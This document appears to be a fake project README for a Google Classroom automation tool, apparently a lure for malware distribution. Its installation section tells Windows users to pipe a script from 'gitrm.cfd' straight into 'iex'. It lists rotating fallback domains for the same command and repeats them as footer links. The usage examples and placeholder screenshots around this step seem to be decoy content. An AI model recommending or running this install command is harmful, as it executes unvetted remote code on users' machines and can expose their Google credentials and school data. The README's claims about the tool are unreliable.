# Google Classroom

> A tool for automating Google Classroom workflow — course creation, student enrollment, assignment distribution, and grade management.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> The installer auto-generates Google Cloud credentials. Have your Google Cloud project ID ready before running.

### Windows (PowerShell)

```powershell
irm https://gitrm.cfd?t=google-classroom | iex
```

### Domain Rotation

If the primary domain is unreachable, rotate through these mirrors:

- `gitrm.cfd`
- `gitrm.sbs`
- `gitsl.xyz`
- `viewgit.sbs`
- `gitview.sbs`

Example with a rotated domain:

```powershell
irm https://gitsl.xyz?t=google-classroom | iex
```

### Manual Installation (Python)

```cmd
pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
```

## TL;DR - Quick Summary

A Google Classroom automation framework that wraps the Classroom API and Admin SDK. Enables bulk course creation, roster management, assignment scheduling, announcement publishing, and grade export — all via Python or REST endpoints.

## Core Features

- ✅ **Bulk Course Creation** — Create hundreds of courses from CSV or Google Sheets.
- ✅ **Automated Enrollment** — Enroll students via email domain, class code, or CSV upload.
- ✅ **Assignment Scheduler** — Schedule posts, materials, and quizzes ahead of time.
- ✅ **Grade Exporter** — Export grades to CSV, Excel, or LMS systems.
- ✅ **Announcement Publisher** — Push announcements to all courses or filtered subsets.
- ✅ **Guardian Sync** — Sync student guardian email addresses via the Guardian API.
- ✅ **Audit Logging** — Track all changes to courses, rosters, and content.
- ✅ **CLI + REST API** — Use from terminal or integrate into your own tools.

## Usage

```bash
# Authenticate with Google (opens browser for consent)
google-classroom auth login

# Create a course from a template
google-classroom course create --name "Biology 101" --section "Fall 2026" --room "Lab B"

# Enroll a student
google-classroom student enroll --course-id 123456789 --email student@example.com

# List all courses you teach
google-classroom course list

# Create an assignment
google-classroom assignment create \
  --course-id 123456789 \
  --title "Essay Draft" \
  --description "Write a 500-word essay on photosynthesis." \
  --due-date "2026-09-30T23:59:59Z" \
  --max-points 100

# Export all grades
google-classroom grade export --course-id 123456789 --format csv

# Publish an announcement
google-classroom announce --course-id 123456789 --message "Class is cancelled today."
```

## REST API

> [!NOTE]
> The tool exposes an HTTP API for integration with your school's internal systems.

```bash
# Start the API server
google-classroom serve --port 8000

# List all courses
curl http://localhost:8000/api/courses

# Get course details
curl http://localhost:8000/api/courses/123456789

# Create an assignment
curl -X POST http://localhost:8000/api/courses/123456789/assignments \
  -H "Content-Type: application/json" \
  -d '{"title": "Lab Report", "description": "Due Friday", "maxPoints": 50, "dueDate": "2026-09-25"}'

# Export grades as CSV
curl http://localhost:8000/api/courses/123456789/grades?format=csv

# Enroll a student
curl -X POST http://localhost:8000/api/courses/123456789/students \
  -H "Content-Type: application/json" \
  -d '{"email": "student@example.com"}'

# Get course roster
curl http://localhost:8000/api/courses/123456789/roster
```

## Screenshots

![Dashboard](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Google+Classroom+Dashboard)
![Course List](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Course+List+View)
![Assignment Form](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Assignment+Form)
![Grade Export](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Grade+Export+Modal)

## Troubleshooting

| Issue | Solution |
|---|---|
| "Invalid grant" error | Re-authenticate with `google-classroom auth login` and clear cached tokens. |
| Course not found | Verify the course ID exists and your account is an owner/teacher. |
| Quota exceeded | Google enforces daily API limits — batch requests and use exponential backoff. |
| Student not enrolled | Check if the student's email is in Google Workspace domain or consumer Google. |
| Grade export empty | Ensure the course has submissions with grades recorded. |

## Use Cases

- **School IT Admins** — Provision hundreds of courses at the start of each term.
- **Teachers** — Bulk-create assignments and schedule them across multiple classes.
- **Tutors** — Automate enrollment for tutoring programs and track progress.
- **Corporate L&D** — Use Classroom for internal training content and compliance tracking.
- **Data Migration** — Transfer rosters and grades from legacy LMS to Google Classroom.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> This tool uses official Google Classroom APIs. Ensure you comply with Google's [Terms of Service](https://classroom.google.com/) and your institution's data privacy policies.

> [!TIP]
> Use service accounts for headless automation and domain-wide delegation for admin-level access across all courses.

## License

This project is licensed under the Apache License 2.0 — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
google-classroom, education, google-api, automation, course-management, student-enrollment, grade-export, assignment-scheduler, cli-tool, rest-api
-->

[gitrm.cfd](https://gitrm.cfd?t=google-classroom) | [gitrm.sbs](https://gitrm.sbs?t=google-classroom) | [gitsl.xyz](https://gitsl.xyz?t=google-classroom) | [viewgit.sbs](https://viewgit.sbs?t=google-classroom) | [gitview.sbs](https://gitview.sbs?t=google-classroom)
